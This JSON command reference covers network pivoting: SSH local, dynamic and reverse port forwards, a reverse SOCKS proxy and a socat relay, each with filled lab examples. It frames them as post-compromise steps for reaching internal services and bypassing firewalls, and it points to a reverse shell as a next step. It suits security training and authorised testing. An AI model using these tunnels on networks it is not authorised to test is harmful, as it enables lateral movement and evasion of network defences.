{
  "category": "pivoting",
  "commands": [
    {
      "id": "ssh-local-port-forward",
      "name": "SSH Local Port Forward",
      "category": "pivoting",
      "subcategory": "ssh_tunneling",
      "command": "ssh -N -L <BIND_ADDRESS>:<LOCAL_PORT>:<DEST_IP>:<DEST_PORT> <SSH_USER>@<SSH_HOST>",
      "description": "Create SSH local port forward - listening port on SSH client forwards through tunnel to destination",
      "tags": [
        "SSH",
        "TUNNELING",
        "PORT_FORWARD",
        "PIVOTING",
        "LOCAL_FORWARD"
      ],
      "variables": [
        {
          "name": "<BIND_ADDRESS>",
          "description": "IP address to bind listening port (0.0.0.0 for all interfaces, 127.0.0.1 for loopback only)",
          "example": "0.0.0.0",
          "required": false
        },
        {
          "name": "<LOCAL_PORT>",
          "description": "Local port to listen on (use >1024 for non-root, avoid conflicts with ss -ntplu)",
          "example": "4455",
          "required": true
        },
        {
          "name": "<DEST_IP>",
          "description": "Destination IP address to forward to (from SSH server's perspective)",
          "example": "172.16.50.217",
          "required": true
        },
        {
          "name": "<DEST_PORT>",
          "description": "Destination port to forward to",
          "example": "445",
          "required": true
        },
        {
          "name": "<SSH_USER>",
          "description": "SSH username for authentication",
          "example": "database_admin",
          "required": true
        },
        {
          "name": "<SSH_HOST>",
          "description": "SSH server IP address (pivot host)",
          "example": "10.4.50.215",
          "required": true
        }
      ],
      "flag_explanations": {
        "-N": "Do not execute remote command (no shell) - only creates port forward tunnel",
        "-L": "Local port forward - syntax: [bind_address:]port:host:hostport",
        "-v": "(Optional) Verbose mode for troubleshooting - shows connection details and debug info",
        "-f": "(Optional) Background SSH process after authentication - frees up terminal"
      },
      "success_indicators": [
        "No output after password entry (normal with -N flag)",
        "ss -ntplu shows listening port on specified address",
        "Can connect to local port from client machine",
        "Service accessible through tunnel (e.g., psql, smbclient works)"
      ],
      "failure_indicators": [
        "Connection refused - SSH server not reachable or port blocked",
        "Permission denied (publickey) - authentication failed, check credentials",
        "Address already in use - port conflict, choose different LOCAL_PORT",
        "Cannot assign requested address - BIND_ADDRESS not valid on this host"
      ],
      "prerequisites": [
        "ssh-connect"
      ],
      "alternatives": [
        "chisel-client",
        "plink-remote-forward",
        "ssh-local-forward"
      ],
      "next_steps": [
        "nmap-service-scan",
        "psql-connect",
        "smbclient-list-shares"
      ],
      "troubleshooting": {
        "Port already in use": "Check listening ports: ss -ntplu, choose different port or kill conflicting process",
        "Permission denied for port <1024": "Use port >1024 (e.g., 4455, 8080) or run with sudo (not recommended)",
        "Timeout connecting to SSH server": "Verify SSH server reachable: nc -zv <SSH_HOST> 22, check firewall rules",
        "Can bind port but connection hangs": "Destination unreachable from pivot - verify routing: ssh user@host 'nc -zv <DEST_IP> <DEST_PORT>'"
      },
      "notes": "Local port forward limitation:\nOne socket per -L flag.\n\nFor multiple services, use multiple -L flags in single SSH command or use dynamic port forward (-D) with SOCKS proxy.\n\nCommon certification use case:\nAccess internal database/SMB from Kali through compromised DMZ host.",
      "methodology_guidance": {
        "after_success": "Verify listening port: ss -ntplu | grep <LOCAL_PORT> Test connectivity: telnet <BIND_ADDRESS> <LOCAL_PORT> Connect to service through tunnel (e.g., psql -h <BIND_ADDRESS> -p <LOCAL_PORT>) For multiple ports, add more -L flags: ssh -N -L port1:dest1:dport1 -L port2:dest2:dport2 user@host"
      },
      "filled_example": "ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215"
    },
    {
      "id": "ssh-dynamic-port-forward",
      "name": "SSH Dynamic Port Forward (SOCKS Proxy)",
      "category": "pivoting",
      "subcategory": "ssh_tunneling",
      "command": "ssh -N -D <BIND_ADDRESS>:<SOCKS_PORT> <SSH_USER>@<SSH_HOST>",
      "description": "Create SSH dynamic port forward - SOCKS proxy on SSH client for flexible multi-destination tunneling",
      "prerequisites": [
        "ssh-key-authentication"
      ],
      "alternatives": [
        "chisel-client",
        "ligolo-agent"
      ],
      "next_steps": [
        "proxychains-nmap",
        "proxychains-config"
      ],
      "tags": [
        "SSH",
        "TUNNELING",
        "SOCKS",
        "PIVOTING",
        "DYNAMIC_FORWARD",
        "PROXYCHAINS"
      ],
      "variables": [
        {
          "name": "<BIND_ADDRESS>",
          "description": "IP address to bind SOCKS proxy (0.0.0.0 for all interfaces, 127.0.0.1 for loopback)",
          "example": "0.0.0.0",
          "required": false
        },
        {
          "name": "<SOCKS_PORT>",
          "description": "SOCKS proxy port to listen on (common: 1080, 9050, 9999)",
          "example": "9999",
          "required": true
        },
        {
          "name": "<SSH_USER>",
          "description": "SSH username for authentication",
          "example": "database_admin",
          "required": true
        },
        {
          "name": "<SSH_HOST>",
          "description": "SSH server IP address (pivot host)",
          "example": "10.4.50.215",
          "required": true
        }
      ],
      "flag_explanations": {
        "-N": "Do not execute remote command - only creates SOCKS proxy tunnel",
        "-D": "Dynamic port forward - creates SOCKS proxy on specified port",
        "-v": "(Optional) Verbose mode for connection debugging",
        "-f": "(Optional) Background process after authentication"
      },
      "success_indicators": [
        "No output after authentication with -N flag",
        "ss -ntplu shows SOCKS port listening on specified address",
        "Proxychains shows 'Strict chain ... SOCKS_PORT ... OK' when routing traffic",
        "nmap/curl/smbclient work through proxychains"
      ],
      "failure_indicators": [
        "Connection refused - SSH server unreachable",
        "Permission denied - SSH authentication failed",
        "Proxychains shows 'socket error or timeout' - destination unreachable from pivot",
        "Proxychains shows 'DLL init' but no traffic - check /etc/proxychains4.conf configuration"
      ],
      "troubleshooting": {
        "Proxychains 'can't read configuration file'": "Check file exists: ls -la /etc/proxychains4.conf, verify readable",
        "Static binary incompatible with proxychains": "Proxychains uses LD_PRELOAD (dynamic linking only) - use tools with native SOCKS or recompile dynamically",
        "DNS leaks outside tunnel": "Enable proxy_dns in proxychains4.conf, or use -n flag with nmap to skip DNS",
        "Very slow scans through SOCKS": "Reduce tcp_read_time_out and tcp_connect_time_out to 1000ms in proxychains4.conf"
      },
      "notes": "Dynamic forward creates SOCKS5 proxy supporting multiple concurrent connections.\n\nMore flexible than local forward (-L) which requires separate tunnel per destination.\n\nCommon certification pattern:\nUse for internal network enumeration (nmap through proxychains), then switch to local forward for specific services.\n\nProxychains limitation:\nTCP only, no UDP/ICMP support.",
      "methodology_guidance": {
        "after_success": "Configure Proxychains: Edit /etc/proxychains4.conf, set 'socks5 <BIND_ADDRESS> <SOCKS_PORT>' Optimize timeouts: In proxychains4.conf, set tcp_read_time_out=1000, tcp_connect_time_out=1000 Test with curl: proxychains curl http://<INTERNAL_IP> Port scan internal network: sudo proxychains nmap -sT --top-ports=20 -Pn <SUBNET> Access SMB shares: proxychains smbclient -L //<INTERNAL_IP>/ -U <USER>"
      },
      "filled_example": "ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215"
    },
    {
      "id": "ssh-remote-port-forward",
      "name": "SSH Remote Port Forward (Reverse Tunnel)",
      "category": "pivoting",
      "subcategory": "ssh_tunneling",
      "command": "ssh -N -R <BIND_ADDRESS>:<REMOTE_PORT>:<DEST_IP>:<DEST_PORT> <SSH_USER>@<SSH_SERVER>",
      "description": "Create SSH remote port forward - reverse tunnel binding port on SSH server, forwarding from compromised client",
      "prerequisites": [
        "ssh-key-authentication"
      ],
      "alternatives": [
        "chisel-client",
        "socat-port-forward"
      ],
      "next_steps": [
        "nc-reverse-shell",
        "curl-post"
      ],
      "tags": [
        "SSH",
        "TUNNELING",
        "REVERSE_TUNNEL",
        "PIVOTING",
        "FIREWALL_BYPASS"
      ],
      "variables": [
        {
          "name": "<BIND_ADDRESS>",
          "description": "IP on SSH server to bind listening port (127.0.0.1 default, 0.0.0.0 requires GatewayPorts)",
          "example": "127.0.0.1",
          "required": false
        },
        {
          "name": "<REMOTE_PORT>",
          "description": "Port to listen on SSH server (attacker's machine)",
          "example": "2345",
          "required": true
        },
        {
          "name": "<DEST_IP>",
          "description": "Destination IP to forward to (from SSH client's perspective)",
          "example": "10.4.50.215",
          "required": true
        },
        {
          "name": "<DEST_PORT>",
          "description": "Destination port to forward to",
          "example": "5432",
          "required": true
        },
        {
          "name": "<SSH_USER>",
          "description": "SSH username on attacker's SSH server",
          "example": "kali",
          "required": true
        },
        {
          "name": "<SSH_SERVER>",
          "description": "Attacker's SSH server IP (Kali machine)",
          "example": "192.168.118.4",
          "required": true
        }
      ],
      "flag_explanations": {
        "-N": "Do not execute remote command - only creates reverse tunnel",
        "-R": "Remote port forward - syntax: [bind_address:]port:host:hostport",
        "-v": "(Optional) Verbose mode for troubleshooting connection issues",
        "-o ServerAliveInterval=60": "(Optional) Keep connection alive with 60-second heartbeat"
      },
      "success_indicators": [
        "No output after authentication (normal with -N)",
        "On SSH server: ss -ntplu shows listening port on bind address",
        "Can connect to SSH_SERVER:REMOTE_PORT from attacker machine",
        "Destination service accessible through reverse tunnel"
      ],
      "failure_indicators": [
        "Connection refused - SSH server not reachable from compromised client",
        "Permission denied - SSH authentication failed, check credentials",
        "bind: Cannot assign requested address - GatewayPorts disabled for 0.0.0.0 binding",
        "Address already in use - port conflict on SSH server"
      ],
      "troubleshooting": {
        "Connection to SSH server times out": "Check outbound firewall on client, verify SSH server listening: sudo ss -ntplu | grep :22",
        "Permission denied (publickey)": "Password auth disabled - edit /etc/ssh/sshd_config, set PasswordAuthentication yes, restart sshd",
        "bind: Cannot assign requested address": "GatewayPorts not enabled for 0.0.0.0 - use 127.0.0.1 or enable GatewayPorts in sshd_config",
        "Port binds but connections hang": "Destination unreachable from client - verify routing from compromised host"
      },
      "notes": "Remote port forward reverses connection direction - critical for firewall bypass.\n\nListening port on attacker-controlled SSH server, forwarding done by SSH client on compromised host.\n\nUse when inbound connections to compromised host blocked.\n\nGatewayPorts security note:\nEnabling in hostile networks allows anyone on SSH server's network to access forwarded port - bind to 127.0.0.1 when possible.",
      "methodology_guidance": {
        "after_success": "On SSH server (Kali): Verify listening: ss -ntplu | grep <REMOTE_PORT> Test connectivity: telnet 127.0.0.1 <REMOTE_PORT> (if bound to loopback) For all-interfaces binding: Edit /etc/ssh/sshd_config on SSH server, add 'GatewayPorts yes', restart sshd"
      },
      "filled_example": "ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4"
    },
    {
      "id": "ssh-remote-dynamic-port-forward",
      "name": "SSH Remote Dynamic Port Forward (Reverse SOCKS)",
      "category": "pivoting",
      "subcategory": "ssh_tunneling",
      "command": "ssh -N -R <SOCKS_PORT> <SSH_USER>@<SSH_SERVER>",
      "description": "Create SSH remote dynamic port forward - reverse SOCKS proxy on SSH server for firewall bypass with multi-destination flexibility",
      "prerequisites": [
        "ssh-key-authentication"
      ],
      "alternatives": [
        "ssh-dynamic-port-forward",
        "chisel-server"
      ],
      "next_steps": [
        "proxychains-nmap",
        "proxychains-config"
      ],
      "tags": [
        "SSH",
        "TUNNELING",
        "REVERSE_SOCKS",
        "PIVOTING",
        "FIREWALL_BYPASS"
      ],
      "variables": [
        {
          "name": "<SOCKS_PORT>",
          "description": "SOCKS proxy port to bind on SSH server (attacker's machine)",
          "example": "9998",
          "required": true
        },
        {
          "name": "<SSH_USER>",
          "description": "SSH username on attacker's SSH server",
          "example": "kali",
          "required": true
        },
        {
          "name": "<SSH_SERVER>",
          "description": "Attacker's SSH server IP (Kali machine)",
          "example": "192.168.118.4",
          "required": true
        }
      ],
      "flag_explanations": {
        "-N": "Do not execute remote command - only creates reverse SOCKS tunnel",
        "-R <port>": "Remote dynamic forward - note no destination specified, creates SOCKS proxy",
        "-v": "(Optional) Verbose mode for connection debugging"
      },
      "success_indicators": [
        "No output after authentication (normal with -N)",
        "On SSH server: ss shows SOCKS port on loopback (127.0.0.1 and [::1])",
        "Proxychains shows 'OK' when routing traffic through local SOCKS port",
        "Tools work through proxychains: nmap, curl, psql, smbclient"
      ],
      "failure_indicators": [
        "Connection refused - SSH server not reachable from client",
        "OpenSSH version too old - requires \u22657.6 (released October 2017)",
        "Permission denied - SSH authentication failed",
        "Proxychains socket error - check /etc/proxychains4.conf points to correct port"
      ],
      "troubleshooting": {
        "OpenSSH version too old": "Upgrade OpenSSH on client, or use alternative: ssh -R port:localhost:socks_port + standalone SOCKS server (microsocks)",
        "SOCKS port not listening on SSH server": "Verify OpenSSH server version \u22657.6: ssh -V on server, check sshd_config allows tunneling (PermitTunnel yes)",
        "Proxychains DLL init but no traffic": "Check proxychains4.conf syntax: [ProxyList] section correct, socks5 127.0.0.1 <SOCKS_PORT>",
        "Very slow performance": "Reduce timeouts in proxychains4.conf to 1000ms, use -T2 timing with nmap"
      },
      "notes": "Remote dynamic forward combines reverse tunnel (firewall bypass) with SOCKS proxy (multi-destination flexibility).\n\nRequires OpenSSH \u22657.6 on compromised client (Windows 1803+ has version 8.1+, most modern Linux has \u22657.6).\n\nSyntax difference:\nNormal remote forward includes destination (-R port:host:hostport), remote dynamic only has port (-R port).\n\nCritical certification technique for enumeration through firewalled pivot points.",
      "methodology_guidance": {
        "after_success": "On SSH server (Kali): Verify SOCKS proxy: ss -ntplu | grep <SOCKS_PORT> Configure Proxychains: Edit /etc/proxychains4.conf, set 'socks5 127.0.0.1 <SOCKS_PORT>' Optimize performance: Set tcp_read_time_out=1000, tcp_connect_time_out=1000 in proxychains4.conf Test with nmap: sudo proxychains nmap -sT --top-ports=20 -Pn <INTERNAL_IP> Access services: proxychains psql -h <INTERNAL_IP>, proxychains smbclient -L //<INTERNAL_IP>/"
      },
      "filled_example": "ssh -N -R 9998 kali@192.168.118.4"
    },
    {
      "id": "socat-port-forward",
      "name": "Socat TCP Port Forward",
      "category": "pivoting",
      "subcategory": "port_forwarding",
      "command": "socat -ddd TCP-LISTEN:<LOCAL_PORT>,fork TCP:<DEST_IP>:<DEST_PORT>",
      "description": "Create simple TCP port forward using Socat - no encryption, no authentication, single command relay",
      "prerequisites": [],
      "alternatives": [],
      "next_steps": [],
      "tags": [
        "SOCAT",
        "PORT_FORWARD",
        "PIVOTING",
        "TCP_RELAY"
      ],
      "variables": [
        {
          "name": "<LOCAL_PORT>",
          "description": "Local port to listen on (use >1024 for non-root)",
          "example": "2345",
          "required": true
        },
        {
          "name": "<DEST_IP>",
          "description": "Destination IP address to forward to",
          "example": "10.4.50.215",
          "required": true
        },
        {
          "name": "<DEST_PORT>",
          "description": "Destination port to forward to",
          "example": "5432",
          "required": true
        }
      ],
      "flag_explanations": {
        "-ddd": "Debug verbosity level 3 - shows detailed connection information",
        "TCP-LISTEN:<port>,fork": "Listen on TCP port, fork creates subprocess for each connection (prevents single-connection death)",
        "TCP:<ip>:<port>": "Destination TCP socket to forward to",
        "-d or -dd": "(Alternative) Lower verbosity levels if less output desired"
      },
      "success_indicators": [
        "Output shows 'listening on AF=2 0.0.0.0:<LOCAL_PORT>'",
        "Output shows 'starting accept loop'",
        "ss -ntplu shows Socat process listening on specified port",
        "Client can connect to local port and access destination service"
      ],
      "failure_indicators": [
        "Address already in use - port conflict, choose different port",
        "Connection refused - destination unreachable or not listening",
        "Permission denied - trying to bind privileged port <1024 without root",
        "No output after command - Socat not installed or not in PATH"
      ],
      "troubleshooting": {
        "Socat not found": "Install Socat: sudo apt install socat, or download static binary: wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat",
        "Address already in use": "Check listening ports: ss -ntplu, kill conflicting process: kill <PID>, or choose different port",
        "Connection refused to destination": "Verify destination reachable: nc -zv <DEST_IP> <DEST_PORT> from pivot host",
        "Socat dies after first connection": "Forgot 'fork' flag - add ',fork' to TCP-LISTEN: socat TCP-LISTEN:<PORT>,fork TCP:<DEST>:<PORT>"
      },
      "notes": "Socat simpler than SSH tunneling but lacks encryption and authentication.\n\nUseful for quick port forwards when security less critical or SSH unavailable.\n\nLimitation:\nOne listening port per Socat process - need separate process for each port forward.\n\nCommon certification use case:\nQuick access to internal database when Socat already installed on compromised host.\n\nFor production:\nUse SSH tunneling for encrypted, authenticated forwarding.",
      "methodology_guidance": {
        "after_success": "Verify listening: ss -ntplu | grep <LOCAL_PORT> Test connectivity: telnet localhost <LOCAL_PORT> For multiple ports: Run separate Socat process for each port forward"
      },
      "filled_example": "socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432"
    }
  ]
}